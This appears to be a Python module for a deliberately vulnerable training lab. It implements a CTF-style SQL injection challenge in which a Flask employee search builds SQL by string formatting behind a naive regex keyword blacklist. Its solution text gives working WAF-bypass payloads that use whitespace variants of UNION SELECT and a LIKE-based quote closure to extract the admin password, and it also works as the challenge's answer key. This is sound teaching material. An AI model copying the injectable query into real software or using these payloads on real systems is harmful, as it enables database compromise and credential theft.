"""员工名录搜索处的 SQL 注入 —— 带关键词过滤。

注入手法本身就是前面两道题学过的（甚至更简单）。这一题多出来的是**过滤器**：
一份按顺序跑的正则规则集，命中就拦。

所以这一题的考点不是"注入怎么打"，而是：

    **你的 payload 语法 / 它的匹配模式** —— 这两者之间的差距就是绕过空间。

规则是故意写得"像真人手写的"（只认一个空格、用字面量当特征），
因为真实环境里的过滤规则大多就是长这样。
"""

import re
import sqlite3

from vuln4all import Vuln, render_template, request

DB_NAME = "staff.db"

#: admin 的密码。取出来并提交才算通关。
SENTINEL = "S3cr3t-1nj3ct3d"

GOAL_FILTER = "让关键词穿过过滤器，并且改变了结果集"
GOAL_PASSWORD = "把 admin 的密码取出来并提交"

# ------------------------------------------------------------------ 过滤层
#
# 这一题真正的考点就是这个 RULES。把它当成一份 WAF 规则集来读：
# 每一条都在描述"攻击长什么样"，而每一条描述都是不完整的。
#
# 写在模块内部是有意的：这个靶场是单进程、core 只做前缀分发，
# 前面挂一个真正独立的 WAF 进程会破坏这个设计。而要绕的技巧一模一样 ——
# 那些技巧针对的是 payload 的语法跟过滤器的模式之间的差距，
# 跟过滤器跑在哪一层没有任何关系。
RULES = [
    # 只认 "--"、"#"、"/*" 这些字面量。过滤器的作者觉得"注释就是攻击特征"。
    ("注释",         r"--|#|/\*"),
    # 只认"union 后面跟**一个**空格再跟 select"。手写规则里最常见的错。
    ("union select", r"(?i)union select"),
    # 想把布尔运算整个封掉。
    ("布尔运算",     r"(?i)\b(or|and)\b"),
    # 想拦住读库结构。
    ("系统表",       r"(?i)sqlite_"),
]

COMPILED = [(name, re.compile(pattern)) for name, pattern in RULES]


def inspect(value):
    """按顺序跑规则，返回命中的规则名；都没命中返回 None。"""
    for name, pattern in COMPILED:
        if pattern.search(value):
            return name
    return None


class KeywordFilter(Vuln):
    info = {
        "name": "带关键词过滤的 SQL 注入",
        "author": ["guaidao2"],
        "cwe": "CWE-89",
        "owasp": "A03:2021 - Injection",
        "difficulty": "困难",
        "description": (
            "搜索框前面挂了一份关键词黑名单：注释、`union select`、布尔运算、系统表。"
            "常见的那些 payload 全被拦了 —— 你要做的是看出**这些规则各自漏了什么**，"
            "然后把注入拼出来。"
        ),
        "hint": (
            "先把一条经典的 payload 打进去，看过滤器报的是哪条规则 —— "
            "拦截页会告诉你规则名，这就等于把规则集的形状泄露给你了。\n"
            "然后一条一条想：\n"
            "  · 那条 `union select` 规则，它匹配的是不是真的只是「一个空格」？\n"
            "    SQL 里还有哪些东西能当 token 之间的分隔符？（SQLite 的空白字符表）\n"
            "  · 注释被拦了，那原本用 `-- ` 收尾的那一招还能用吗？\n"
            "    不能的话，怎么让后面的 `%'` 变成语法上合法的一部分？\n"
            "  · `OR` / `AND` 被拦了 —— SQLite 里还有别的办法让条件成立吗？\n"
            "  · 系统表被拦了，但这一题的目标表叫 users。"
        ),
        "solution": (
            "一、先确认过滤器的存在和形状。打一条经典 payload：\n"
            "   x' UNION SELECT username,password,role FROM users-- \n"
            "   被拦，规则名是「注释」。\n\n"
            "二、把注释去掉。不用 `-- ` 就得让后面的 `%'` 成为合法语法的一部分 ——\n"
            "   把它接进一个恒真的条件里：\n"
            "   ... WHERE 'b'LIKE'b%'\n"
            "   注意 `WHERE 'b'LIKE'b` + 模板尾巴的 `%'` = `'b'LIKE'b%'`，刚好闭合。\n\n"
            "三、绕过那条 `union select` 规则。它只认**一个空格**。\n"
            "   SQLite 认的空白字符不止空格：制表符、换行都行。所以把\n"
            "   `UNION SELECT` 写成：\n"
            "     UNION  SELECT      ← 两个空格\n"
            "     UNION\tSELECT      ← 制表符（URL 里是 %09）\n"
            "     UNION\nSELECT      ← 换行（URL 里是 %0A）\n"
            "   另外 `UNION/**/SELECT` 也可以（块注释在 SQLite 里当空白），\n"
            "   但那会被「注释」那条规则拦掉。\n\n"
            "四、完整 payload：\n"
            "   x' UNION  SELECT username,password,role FROM users WHERE 'b'LIKE'b\n\n"
            "   拼进模板之后是：\n"
            "   SELECT name,dept,ext FROM staff WHERE name LIKE '%x'\n"
            "     UNION  SELECT username,password,role FROM users WHERE 'b'LIKE'b%'\n\n"
            "   两边都是三列，users 的行就跟着出来了。\n\n"
            "五、把读到的密码提交到页面下面的框里。\n\n"
            "这一题的教训：\n"
            "  · 别用**字面量**描述攻击特征。`union select` 是一个字面量，\n"
            "    `union` + 任意空白 + `select` 才是一个**结构**。\n"
            "  · 过滤器列了一堆规则不等于封住了那条路 —— 每一条都有自己的盲区，\n"
            "    而盲区是可以一个个试出来的。\n"
            "  · 拦截页把命中的规则名报给你，这本身就是一份免费的地图。"
        ),
        "refs": [
            "https://portswigger.net/web-security/sql-injection",
            "https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF",
        ],
    }

    # ------------------------------------------------------------ 生命周期

    def setup(self, ctx):
        con = sqlite3.connect(str(ctx.workspace / DB_NAME))
        con.executescript(
            """
            CREATE TABLE staff (
                name TEXT NOT NULL,
                dept TEXT NOT NULL,
                ext  TEXT NOT NULL
            );
            INSERT INTO staff (name, dept, ext) VALUES
                ('张三', '研发', '8101'),
                ('李四', '市场', '8202'),
                ('王五', '运维', '8303'),
                ('赵六', '客服', '8404');

            CREATE TABLE users (
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                role     TEXT NOT NULL
            );
            INSERT INTO users (username, password, role) VALUES
                ('admin', '%s', 'admin'),
                ('alice', 'alice-is-not-the-target', 'user');
            """
            % SENTINEL
        )
        con.commit()
        con.close()

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)
        db_path = str(ctx.workspace / DB_NAME)

        def search(sql):
            con = sqlite3.connect(db_path)
            try:
                return con.execute(sql).fetchall()
            finally:
                con.close()

        @app.route("/", methods=["GET", "POST"])
        def index():
            keyword = ""
            rows = []
            blocked = None
            leaked = False
            feedback = None

            if request.method == "POST" and "keyword" in request.form:
                keyword = request.form.get("keyword", "")

                # ↓↓↓ 这里是过滤层。它看的是用户原样的输入。 ↓↓↓
                blocked = inspect(keyword)
                # ↑↑↑ 拦截是"命中就拦"，不是"删掉命中的部分" ——
                #     所以这里要的是"让规则不命中"，不是"让规则删不到"。↑↑↑

                if blocked is None:
                    # 过了过滤器，然后照旧拼字符串 —— 洞本身跟前面两道一样
                    sql = (
                        "SELECT name, dept, ext FROM staff "
                        "WHERE name LIKE '%{}%'".format(keyword)
                    )
                    try:
                        rows = search(sql)
                    except sqlite3.Error:
                        rows = []

                    try:
                        genuine = {
                            (row[0], row[1], row[2])
                            for row in search("SELECT name, dept, ext FROM staff")
                        }
                    except sqlite3.Error:
                        genuine = set()
                    leaked = any(tuple(row) not in genuine for row in rows)
                    if leaked:
                        ctx.progress.mark(GOAL_FILTER)

            elif request.method == "POST":
                guess = request.form.get("guess", "").strip()
                if guess:
                    if guess == SENTINEL:
                        ctx.progress.mark(GOAL_PASSWORD)
                        feedback = ("ok", "密码对了。")
                    else:
                        feedback = ("bad", "不对。")

            return render_template(
                "index.html",
                keyword=keyword,
                rows=rows,
                blocked=blocked,
                leaked=leaked,
                feedback=feedback,
                rules=[name for name, _ in RULES],
            )

        return {"": app}

    # ---------------------------------------------------------------- 进度

    def check(self, ctx):
        return {
            GOAL_FILTER: ctx.progress.achieved(GOAL_FILTER),
            GOAL_PASSWORD: ctx.progress.achieved(GOAL_PASSWORD),
        }
